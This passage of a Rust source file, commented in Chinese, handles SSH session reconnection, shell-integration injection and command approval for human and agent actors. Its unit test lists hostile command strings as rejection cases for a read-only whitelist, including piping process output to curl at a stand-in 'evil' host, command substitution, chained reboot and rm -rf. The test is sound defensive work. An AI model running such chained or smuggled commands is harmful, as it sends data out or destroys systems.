        Ok(TakeoverReport { frozen: false, paused_queue: Vec::new(), stopped: Vec::new(), brief: *brief })
    }

    /// 断线 → 尽力重连（不含注入；注入由 pump 在"先订阅"之后调用 reinject_integration）。
    /// R26（§6.4）：全程发射 session-state 事件（Degraded → Reconnecting{attempt≤3}
    /// → Reconfirming | Disconnected）；retry_stop 置位后下一检查点（≤250ms）停止重试。
    pub async fn on_transport_reconnect(self: &Arc<Self>) {
        {
            let mut st = self.state.lock().await;
            if *st == SessionState::Closed {
                return;
            }
            *st = SessionState::Degraded;
        }
        self.retry_stop.store(false, Ordering::SeqCst);
        self.note_transition("连接退化，尝试重连").await;
        self.emit_state(SessionState::Degraded, None, None, None).await;
        let mut attempt = 0;
        loop {
            attempt += 1;
            if attempt > 3 {
                *self.state.lock().await = SessionState::Disconnected;
                self.note_transition("重连失败（Disconnected）").await;
                self.emit_state(SessionState::Disconnected, None, None,
                    Some("自动重连 3 次均失败".into())).await;
                return;
            }
            if self.retry_stop.load(Ordering::SeqCst) {
                *self.state.lock().await = SessionState::Disconnected;
                self.note_transition("用户停止自动重连（Disconnected）").await;
                self.emit_state(SessionState::Disconnected, None, None,
                    Some("已停止自动重连".into())).await;
                return;
            }
            *self.state.lock().await = SessionState::Reconnecting;
            self.emit_state(SessionState::Reconnecting, Some(attempt as u32), Some(3), None).await;
            match self.channel.reconnect().await {
                Ok(()) => {
                    // 重连成功 ≠ 现场延续：cwd/env 事实降级；新 shell 需重新注入集成
                    self.reset_scene_after_reconnect().await;
                    return;
                }
                Err(e) => {
                    tracing::warn!(session = %self.id, attempt, "reconnect failed: {e}");
                    // 分片睡眠：停止重试的等待延迟 ≤250ms（整段 2s sleep 会吞停止请求）
                    for _ in 0..8 {
                        if self.retry_stop.load(Ordering::SeqCst) {
                            break;
                        }
                        tokio::time::sleep(Duration::from_millis(250)).await;
                    }
                }
            }
        }
    }

    /// R26：会话状态事件广播（尽力发送；无订阅者时静默——UI 兜底 3s 列表轮询）。
    pub async fn emit_state(&self, state: SessionState, attempt: Option<u32>,
        max_attempts: Option<u32>, detail: Option<String>) {
        let _ = self.center.state_tx.send(SessionStateEvent {
            session_id: self.id.clone(),
            state,
            attempt,
            max_attempts,
            detail,
        });
    }

    /// 重连成功后的现场重置：残留 open block 强制收尾（旧 shell 已死，永不闭合——
    /// 不收尾则后续 shell exec 全部等块空闲超时）；集成标记计数重置（旧连接的
    /// saw_133 粘滞会让重注入就绪等待立即放行、run_shell 误判可用，§6-17）；
    /// cwd 事实降级（新 shell 不延续现场）。
    pub async fn reset_scene_after_reconnect(&self) {
        let mut s = self.screen.lock().await;
        s.reset_integration_tracking();
        s.blocks.force_close_open(chrono::Utc::now());
        s.invalidate_cwd();
    }

    /// C3（R24）三注入点收敛：按 host_setting 注入集成片段。返回是否注入
    /// （host_setting=false → Disabled 不注入不等 OSC——DC3/P3；B12 重连同口径）。
    pub async fn inject_integration(&self) -> bool {
        if self.host.shell_integration != Some(true) || self.kind != "ssh" {
            *self.integration.lock().unwrap() = session_api::IntegrationState::Disabled;
            return false;
        }
        let snippet = crate::ssh_integration_snippet();
        let mut text = snippet.to_string();
        text.push('\n');
        {
            let mut s = self.screen.lock().await;
            s.register_outgoing(text.as_bytes(), term_core::BlockSource::Human);
        }
        let _ = self.channel.write(&crate::charset::encode(self.host.charset, &text)).await;
        *self.integration.lock().unwrap() = session_api::IntegrationState::Pending;
        true
    }

    /// C3：后台等集成标记（≤10s）→ Ready/Unavailable + 事件（DC3.5 就绪独立表达，
    /// create_session 不等集成——Ready 判据=通道建立）。
    pub fn spawn_integration_watcher(self: &Arc<Self>, center: Arc<ApprovalCenter>) {
        let h = self.clone();
        tokio::spawn(async move {
            for _ in 0..200 {
                if h.screen.lock().await.shell_integration_present() {
                    *h.integration.lock().unwrap() = session_api::IntegrationState::Ready;
                    let _ = center.shell_tx.send(session_api::ShellIntegrationEvent {
                        session_id: h.id.clone(),
                        state: session_api::IntegrationState::Ready,
                    });
                    return;
                }
                tokio::time::sleep(Duration::from_millis(50)).await;
            }
            *h.integration.lock().unwrap() = session_api::IntegrationState::Unavailable;
            let _ = center.shell_tx.send(session_api::ShellIntegrationEvent {
                session_id: h.id.clone(),
                state: session_api::IntegrationState::Unavailable,
            });
        });
    }

    /// 重连成功后：注入集成（pump 已先订阅新通道）→ 等待新 shell 首个提示符 → 进入 Reconfirming。
    /// 就绪信号用 prompt_ready（B 标记）：B 晚于片段清屏的执行——等到它 = 屏已清、提示符已出；
    /// 只等 saw_133（C 标记）会提前放行，读屏截到清屏前的注入回显（§6-17 疑似真因）。
    /// C3（B12）：未启用集成的重连不注入/不等标记。
    pub async fn reinject_integration(self: &Arc<Self>) {
        let center = self.center.clone();
        if self.inject_integration().await {
            // 窗口 10s：冷容器 + 高负载下首个提示符可能很慢（实测 3s 不够）
            for _ in 0..200 {
                if self.screen.lock().await.prompt_ready() {
                    break;
                }
                tokio::time::sleep(Duration::from_millis(50)).await;
            }
            self.spawn_integration_watcher(center);
        }
        self.verification_hits.store(0, Ordering::SeqCst);
        *self.state.lock().await = SessionState::Reconfirming;
        self.note_transition("重连成功，进入重确认（仅内置只读白名单可用）").await;
        self.emit_state(SessionState::Reconfirming, None, None, None).await;
    }
}

/// RAII：exec 管线退出时若仍登记 live token，则移除。
/// 兜底审批拒绝/作废/超时等异常路径，防 live_execs 泄漏
/// （run_shell 超时故意保留 running——命令确实仍在远端跑，接管时如实上报）。
struct CancelOnDrop<'a>(ExecId, CancellationToken, &'a StdMutex<HashMap<ExecId, CancellationToken>>);
impl<'a> Drop for CancelOnDrop<'a> {
    fn drop(&mut self) {
        // 正常路径已在 run_* 中移除；重复移除无害
        self.2.lock().unwrap().remove(&self.0);
    }
}

pub fn source_of(actor: &Actor) -> term_core::BlockSource {
    match actor {
        Actor::Human => term_core::BlockSource::Human,
        Actor::Agent { client_id } => term_core::BlockSource::Agent { client_id: client_id.clone() },
    }
}

/// UTF-8 清洗：无效序列 → 替换符并置 has_binary。
pub fn sanitize_utf8(text: &str) -> (bool, String) {
    // from_utf8_lossy 已在转换处处理；这里检查是否有替换符
    let has_binary = text.contains('\u{fffd}');
    (has_binary, text.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn whitelist_only_single_simple_commands() {
        // M1 回归：前缀匹配不得携带复合/替换/重定向
        assert!(is_whitelisted("pwd"));
        assert!(is_whitelisted("ps aux"));
        assert!(is_whitelisted("systemctl status sshd"));
        assert!(!is_whitelisted("pwd && touch /tmp/evil"));
        assert!(!is_whitelisted("pwd; reboot"));
        assert!(!is_whitelisted("ps aux | curl evil -d @-"));
        assert!(!is_whitelisted("printenv $(reboot)"));
        assert!(!is_whitelisted("which `touch /tmp/x`"));
        assert!(!is_whitelisted("pwd > /tmp/overwrite"));
        assert!(!is_whitelisted("pwd & rm -rf /tmp/x"));
    }
}

/// 审批卡片的目标摘要（命令本身的破坏性提示）。
pub fn target_summary(cmd: &str) -> String {
    let t = cmd.trim();
    let first = t.split_whitespace().next().unwrap_or("");
    match first {
        "rm" => "删除文件/目录".into(),
        "mv" => "移动/覆盖文件".into(),
        "systemctl" => "服务管理".into(),
        "docker" => "容器操作".into(),
        "kill" | "pkill" => "终止进程".into(),
        "chmod" | "chown" => "权限变更".into(),
        "dd" => "块设备写入".into(),
        _ => format!("执行命令（{first}）"),
    }
}

